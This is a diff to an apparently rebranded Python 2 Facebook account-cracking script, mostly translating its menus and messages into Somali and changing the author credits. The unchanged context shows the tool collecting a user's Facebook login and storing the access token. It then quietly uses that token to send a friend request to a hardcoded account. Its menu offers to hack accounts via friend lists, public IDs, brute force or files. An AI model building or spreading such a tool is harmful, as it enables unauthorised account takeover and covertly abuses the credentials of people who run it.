@@ -55,7 +55,7 @@ logo = """
 ██║░░░░░██║██║░╚██╗██║░░██║██║░░██║██████╔╝╚█████╔╝
 ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mcreat by\033[1;36m : \033[1;31mYahye A Dahir_\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mcreat by\033[1;36m : \033[1;31mYahye Abdirahaman Dahir_\033[0;31m║
 \033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/fikrado\033[0m \033[0;31m║
 \033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m+252634048063\033[0;31m║
 \033[0;39m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
@@ -77,7 +77,7 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔════════════════════════☠════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mKuso O DHawow\x1b[0;31m  \033[1;96m   
+print  """\x1b[0;31m [¤] \x1b[0;31mKU SO DHAWOW\x1b[0;31m  \033[1;96m   
 \033[1;96m[¤] \x1b[0;31mWHATSAPP : +252634048063\x1b[1;96m  
 \033[1;93m[¤] \x1b[0;31mFACEBOOK : fikrado\x1b[1;96m  
 \033[1;93m[¤] \x1b[0;31mYOUTUBE  : fikrado hacker \x1b[0;31m"""
@@ -88,9 +88,9 @@ CorrectPassword = "fikrado"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
+    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME GALI \x1b[1;96m>>>> ")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
+    	password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD GALI \x1b[1;96m>>>> ")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username
             loop = 'false'
@@ -110,7 +110,7 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;91mAPNA FACEBOOK ACCOUNT LOGIN KREIN \x1b[1;96m[☆]' )
+		print('\033[1;96m[☆] \x1b[1;91mWAXAAD ISTICMAASHA FACEBOOK ACOUNT SI AAD U GASHID \x1b[1;96m[☆]' )
 		id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
 		pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
@@ -140,19 +140,19 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UC5a0NVFHNdzVgyI2M3PiN9g')
+				os.system('xdg-open https://www.youtube.com/watch?v=RPHdCNRUjno')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\x1b[1;91m[!] There is no internet connection"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
+			print("\n\x1b[1;92m[!] WAA LAGA XAYIRA EE MID KALE GALI")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mPassword/Email is wrong")
+			print("\n\x1b[1;93mPassword/Email WAA KHALAD")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -231,11 +231,11 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
-	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
-	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
-	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
-	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
+	print "\x1b[1;32;40m[1] \033[1;33;40m══Asxaab tada ka hacking"
+	print "\x1b[1;32;40m[2] \033[1;33;40m══Qof kale Asxaab tiisa ka hacking"
+	print "\x1b[1;32;40m[3] \033[1;33;40m══Qof si toosa oga hacking"
+	print "\x1b[1;32;40m[4] \033[1;33;40m══QOF File ka haysid ka hacking"
+	print "\x1b[1;32;40m[0] \033[1;33;40m══DIb oga noqo"
 	pilih_super()
 
 def pilih_super():
@@ -296,12 +296,12 @@ def pilih_super():
 	jalan('\033[1;34;40m[✺] Please Wait...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;32;40m[✺] Bilaabmay\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;31;48m●══════════════════════JAM══════════════════════●"
+	print "   \033[1;31;48m●══════════════════════FIKRADO══════════════════════●"
 
-	jalan('            \033[1;91mJam waa uu bilaab may ee sug...')
-	print  "  \033[1;36;48m ●══════════════════════JAM══════════════════════●" 
+	jalan('            \033[1;91mYaxye waa uu bilaaway inu qofka ka hacking gareeyo...')
+	print  "  \033[1;36;48m ●══════════════════════HACKER══════════════════════●" 
 
 	def main(arg):
 		global cekpoint,oks
